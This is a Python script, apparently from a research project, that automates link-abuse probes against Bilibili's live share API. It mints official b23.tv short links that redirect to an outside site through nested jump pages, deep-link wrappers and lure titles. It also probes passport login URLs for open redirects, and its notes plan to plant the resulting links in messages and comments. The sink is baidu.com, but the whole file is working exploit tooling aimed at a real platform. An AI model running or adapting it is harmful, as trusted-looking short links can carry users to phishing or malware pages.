#!/usr/bin/env python3
"""Probe valuable abuse-sim tracks (A1 family, B-*, A2 sample, A3 HTTP).

Sink: https://www.baidu.com
Writes per-track results under report/*/ and report/batch_results.json
Research only. App final verdict is manual.
"""

from __future__ import annotations

import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "app"))
from core import build_jump_long_url, generate, mint_b23, resolve_b23  # noqa: E402

SINK = "https://www.baidu.com"
UA = (
    "Mozilla/5.0 BiliDroid/7.71.0 (bbcallen@gmail.com) "
    "os/android model/Pixel mobi_app/android build/7710300"
)
BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)
REPORT = Path(__file__).resolve().parent


def mint_custom(
    oid: str,
    *,
    api: str = "https://api.bilibili.com/x/share/click",
    share_title: str | None = None,
    share_content: str | None = None,
) -> dict:
    params = {
        "platform": "android",
        "share_channel": "COPY",
        "share_id": "public.webview.0.0.pv",
        "share_mode": "4",
        "oid": oid,
        "buvid": "XY" + uuid.uuid4().hex[:30].upper(),
        "build": "7710300",
        "share_session_id": str(uuid.uuid4()),
        "ts": str(int(time.time())),
    }
    if share_title is not None:
        params["share_title"] = share_title
    if share_content is not None:
        params["share_content"] = share_content
    data = urllib.parse.urlencode(params).encode()
    req = urllib.request.Request(
        api,
        data=data,
        method="POST",
        headers={
            "User-Agent": UA,
            "Content-Type": "application/x-www-form-urlencoded",
            "App-Key": "android64",
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=25) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            http = resp.status
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        http = e.code
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "error": str(e), "http": None, "short_url": None}

    try:
        payload = json.loads(body)
    except json.JSONDecodeError:
        return {"ok": False, "error": f"non_json:{body[:120]}", "http": http, "short_url": None}

    content = ((payload.get("data") or {}).get("content") or "").strip()
    m = re.search(r"https?://b23\.tv/[A-Za-z0-9]+", content)
    short = m.group(0) if m else None
    loc = resolve_b23(short) if short else None
    return {
        "ok": bool(short),
        "error": None if short else "no_b23",
        "http": http,
        "code": payload.get("code"),
        "message": payload.get("message"),
        "api_content": content or None,
        "short_url": short,
        "location": loc,
        "payload_trim": json.dumps(payload, ensure_ascii=False)[:500],
        "api": api,
        "oid": oid,
        "share_title": share_title,
        "share_content": share_content,
    }


def http_probe(url: str, method: str = "GET", data: bytes | None = None) -> dict:
    class NoRedir(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):  # noqa: ANN002, ANN003
            return None

    opener = urllib.request.build_opener(NoRedir)
    req = urllib.request.Request(
        url,
        data=data,
        method=method,
        headers={"User-Agent": BROWSER_UA},
    )
    try:
        with opener.open(req, timeout=20) as resp:
            return {
                "status": resp.status,
                "location": resp.headers.get("Location"),
                "final_url": resp.geturl(),
                "body_snip": resp.read(300).decode("utf-8", errors="replace"),
            }
    except urllib.error.HTTPError as e:
        return {
            "status": e.code,
            "location": e.headers.get("Location") if e.headers else None,
            "final_url": None,
            "body_snip": e.read(300).decode("utf-8", errors="replace") if e.fp else "",
        }
    except Exception as e:  # noqa: BLE001
        return {"status": None, "location": None, "final_url": None, "error": str(e)}


def write_products(track: str, rows: list[dict], note: str, app_expect: str) -> None:
    d = REPORT / track
    d.mkdir(parents=True, exist_ok=True)
    lines = [
        f"# {track} 最终产物",
        "",
        f"> Sink: `{SINK}`  ",
        f"> App 期望: **{app_expect}**  ",
        "> 浏览器失败 ≠ 终判失败。终判以你在 **B 站 App** 内结果为准。",
        "",
        f"_批次: {time.strftime('%Y-%m-%d %H:%M')} · `report/run_valuable.py`_",
        "",
        note,
        "",
        "## 产物表",
        "",
        "| id | 成功 | short_url / 测试 URL | 备注 | App |",
        "|----|------|----------------------|------|-----|",
    ]
    copy_block = []
    for r in rows:
        sid = r.get("id", "")
        ok = "✅" if r.get("ok") else "❌"
        product = r.get("short_url") or r.get("test_url") or "-"
        remark = (r.get("remark") or r.get("error") or "")[:80].replace("|", "/")
        lines.append(f"| {sid} | {ok} | `{product}` | {remark} | ⬜ |")
        if r.get("short_url"):
            copy_block.append(r["short_url"])
        elif r.get("test_url") and r.get("ok"):
            copy_block.append(r["test_url"])
    lines.extend(["", "## 复制列表", "", "```text"])
    lines.extend(copy_block or ["(无成功产物)"])
    lines.extend(["```", "", "## App 实测登记", "", "测完把上表 App 列改为 ✅/❌/🟨，并更新本目录 README 状态。", ""])
    (d / "products.md").write_text("\n".join(lines), encoding="utf-8")
    (d / "results.json").write_text(
        json.dumps({"track": track, "sink": SINK, "cases": rows}, ensure_ascii=False, indent=2),
        encoding="utf-8",
    )


def main() -> int:
    batch: dict = {"sink": SINK, "ts": int(time.time()), "tracks": {}}
    long_a1 = build_jump_long_url(SINK)

    # --- A1 ---
    print("A1 ...", flush=True)
    try:
        g = generate(SINK)
        a1 = {
            "id": "a1_baidu",
            "ok": True,
            "short_url": g["short_url"],
            "long_url": g["long_url"],
            "location": g.get("location"),
            "remark": "core.generate",
        }
    except Exception as e:  # noqa: BLE001
        a1 = {"id": "a1_baidu", "ok": False, "error": str(e)}
    write_products(
        "A1",
        [a1],
        "主滥用原型：mall jump + mall/web + public.webview，T=baidu。",
        "到达百度",
    )
    batch["tracks"]["A1"] = [a1]
    time.sleep(0.4)

    # --- A1-alt-host ---
    print("A1-alt-host ...", flush=True)
    alt = mint_custom(long_a1, api="https://api.biliapi.net/x/share/click")
    alt["id"] = "a1_biliapi_net"
    alt["remark"] = "api.biliapi.net + A1 long oid"
    alt["long_url"] = long_a1
    write_products(
        "A1-alt-host",
        [alt],
        "同 A1 长链，签发 host 换 `api.biliapi.net`。",
        "到达百度",
    )
    batch["tracks"]["A1-alt-host"] = [alt]
    time.sleep(0.4)

    # --- A1-title ---
    print("A1-title ...", flush=True)
    title_cases = []
    for tid, title, content in [
        ("title_clean", "官方活动入口", "点击查看详情"),
        ("title_neutral", "分享链接", None),
    ]:
        r = mint_custom(long_a1, share_title=title, share_content=content)
        r["id"] = tid
        r["remark"] = f"title={title!r} content={content!r} raw_content={r.get('api_content')!r}"
        title_cases.append(r)
        time.sleep(0.35)
    write_products(
        "A1-title",
        title_cases,
        "A1 载荷 + `share_title`/`share_content`：看 `api_content` 是否被诱导文案污染。",
        "到达百度（文案仅社工面）",
    )
    batch["tracks"]["A1-title"] = title_cases

    # --- B-mint-policy ---
    print("B-mint-policy ...", flush=True)
    b_cases = []
    for bid, oid, expect_ok in [
        ("neg_baidu_direct", SINK, False),
        ("pos_www_root", "https://www.bilibili.com/", True),
        ("neg_example", "https://www.example.com/", False),
    ]:
        r = mint_custom(oid)
        r["id"] = bid
        r["remark"] = f"expect_ok={expect_ok} actual_ok={r.get('ok')}"
        r["expect_ok"] = expect_ok
        r["policy_match"] = (r.get("ok") is True) == expect_ok
        b_cases.append(r)
        time.sleep(0.35)
    write_products(
        "B-mint-policy",
        b_cases,
        "积木：baidu **直接** oid 应失败；站内应成功。成功的站内 b23 **不是**滥用终态。",
        "无「到 baidu」终判（负例应无短链）",
    )
    batch["tracks"]["B-mint-policy"] = b_cases

    # --- B-nest ---
    print("B-nest ...", flush=True)
    nest_cases = []
    # double wrap: jump(jump(baidu)) via putting A1 long as target of another jump
    inner = build_jump_long_url(SINK)
    double = build_jump_long_url(inner)  # treats jump URL as "external" target inside mall/web
    # triple encode style: wrap baidu in d.bilibili only then jump
    schema = "bilibili://mall/web?url=" + urllib.parse.quote(SINK, safe="")
    d_only = "https://d.bilibili.com/?" + urllib.parse.urlencode({"schema": schema})
    jump_d = "https://mall.bilibili.com/jump.html?" + urllib.parse.urlencode({"Url": d_only})
    # nest: jump Url= jump Url= d schema
    mid = "https://mall.bilibili.com/jump.html?" + urllib.parse.urlencode({"Url": jump_d})
    for nid, oid in [
        ("double_jump_via_core", double),
        ("standard_a1", jump_d),
        ("jump_of_jump", mid),
    ]:
        r = mint_custom(oid)
        r["id"] = nid
        r["long_url"] = oid
        r["remark"] = f"oid_len={len(oid)} loc_has_baidu={('baidu' in (r.get('location') or '').lower())}"
        nest_cases.append(r)
        time.sleep(0.4)
    write_products(
        "B-nest",
        nest_cases,
        "多层嵌套仍嵌入 baidu 后签发。成功者请在 App 验证是否仍到百度。",
        "到达百度（若客户端仍解析内层）",
    )
    batch["tracks"]["B-nest"] = nest_cases

    # --- A2-container: candidate bilibili URLs that embed baidu in query ---
    print("A2-container ...", flush=True)
    baidu_q = urllib.parse.quote(SINK, safe="")
    candidates = [
        ("jump_Url", f"https://mall.bilibili.com/jump.html?Url={baidu_q}"),
        ("jump_url_lower", f"https://mall.bilibili.com/jump.html?url={baidu_q}"),
        ("d_schema_http", "https://d.bilibili.com/?" + urllib.parse.urlencode({"schema": SINK})),
        (
            "d_schema_mallweb",
            "https://d.bilibili.com/?"
            + urllib.parse.urlencode({"schema": "bilibili://mall/web?url=" + SINK}),
        ),
        (
            "www_link_url",
            f"https://www.bilibili.com/blackboard/link.html?url={baidu_q}",
        ),
        (
            "live_html_q",
            f"https://live.bilibili.com/p/html/live-app-hotrank/index.html?url={baidu_q}",
        ),
        (
            "link_jump_type",
            f"https://link.bilibili.com/?jump_type=browser&url={baidu_q}",
        ),
        (
            "search_keyword_url",
            f"https://search.bilibili.com/all?keyword={baidu_q}",
        ),
    ]
    a2c = []
    for cid, oid in candidates:
        r = mint_custom(oid)
        r["id"] = cid
        r["test_url"] = oid
        has_baidu = "baidu" in (r.get("location") or "").lower() or "baidu" in oid.lower()
        r["remark"] = f"mint_ok={r.get('ok')} loc_mentions_baidu={has_baidu}"
        a2c.append(r)
        time.sleep(0.35)
    write_products(
        "A2-container",
        a2c,
        "抽样：把 baidu 塞进不同站内 URL query 再 public.webview。"
        "「能签发」≠「App 会打开 baidu」；须 App 验证。",
        "到达百度（仅当该容器真解析外链）",
    )
    batch["tracks"]["A2-container"] = a2c

    # --- A2-deeplink: mint after wrapping schemes in d.bilibili / jump ---
    print("A2-deeplink ...", flush=True)
    schemes = [
        ("mall_web", f"bilibili://mall/web?url={SINK}"),
        ("browser", f"bilibili://browser?url={SINK}"),
        ("webview", f"bilibili://webview?url={SINK}"),
        ("link", f"bilibili://link?url={SINK}"),
        ("http", f"bilibili://http?url={SINK}"),
    ]
    a2d = []
    for sid, scheme in schemes:
        d_url = "https://d.bilibili.com/?" + urllib.parse.urlencode({"schema": scheme})
        jump = "https://mall.bilibili.com/jump.html?" + urllib.parse.urlencode({"Url": d_url})
        r = mint_custom(jump)
        r["id"] = sid
        r["scheme"] = scheme
        r["long_url"] = jump
        r["remark"] = f"scheme={scheme[:50]}"
        a2d.append(r)
        time.sleep(0.35)
    write_products(
        "A2-deeplink",
        a2d,
        "把候选 `bilibili://…url=baidu` 包进 d.bilibili + jump 再签发。"
        "是否打开取决于客户端路由，必须 App 测。",
        "到达百度",
    )
    batch["tracks"]["A2-deeplink"] = a2d

    # --- A3-passport: open-redirect style probes (no login required for some endpoints) ---
    print("A3-passport ...", flush=True)
    gourl = urllib.parse.quote(SINK, safe="")
    a3 = []
    probes = [
        (
            "passport_login_gourl_get",
            f"https://passport.bilibili.com/login?gourl={gourl}",
        ),
        (
            "passport_login_go_url",
            f"https://passport.bilibili.com/login?go_url={gourl}",
        ),
        (
            "www_login_gourl",
            f"https://www.bilibili.com/?gourl={gourl}",
        ),
        (
            "crossDomain_shape",
            "https://passport.biligame.com/crossDomain?gourl=" + gourl,
        ),
    ]
    for pid, url in probes:
        h = http_probe(url)
        loc = h.get("location") or ""
        # soft signal: redirect location contains baidu
        openish = "baidu" in loc.lower() or "baidu" in (h.get("final_url") or "").lower()
        a3.append(
            {
                "id": pid,
                "ok": openish,  # open-redirect signal only
                "test_url": url,
                "short_url": None,
                "location": loc or None,
                "http_status": h.get("status"),
                "remark": f"status={h.get('status')} loc={loc[:100]!r} err={h.get('error')}",
                "raw": h,
            }
        )
        time.sleep(0.3)
    write_products(
        "A3-passport",
        a3,
        "开放重定向面探测（未登录）。`ok=✅` 仅表示 **HTTP Location/最终 URL 出现 baidu 字样**，"
        "不是完整登录链滥用。需你在浏览器/App Web 进一步确认。",
        "是否跳到百度或危险页（Web 侧）",
    )
    batch["tracks"]["A3-passport"] = a3

    # A4: no automated test
    for track, reason in [
        ("A4-dm", "需登录发私信"),
        ("A4-reply", "需登录发评论"),
        ("A4-dynamic-web", "需登录发动态"),
        ("A4-dynamic-goods", "需登录/商品能力"),
    ]:
        write_products(
            track,
            [{"id": "skipped", "ok": False, "remark": reason, "error": reason}],
            f"🚫 {reason}。有 A1 脏 b23 后人工挂载。可复用 A1 产物：见 `report/A1/products.md`。",
            "接收方点开后到百度",
        )
        batch["tracks"][track] = [{"skipped": True, "reason": reason}]

    out = REPORT / "batch_results.json"
    out.write_text(json.dumps(batch, ensure_ascii=False, indent=2), encoding="utf-8")
    print("wrote", out)

    # summary
    for name, cases in batch["tracks"].items():
        if cases and cases[0].get("skipped"):
            print(f"  {name}: SKIP")
            continue
        ok = sum(1 for c in cases if c.get("ok"))
        print(f"  {name}: {ok}/{len(cases)} ok")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
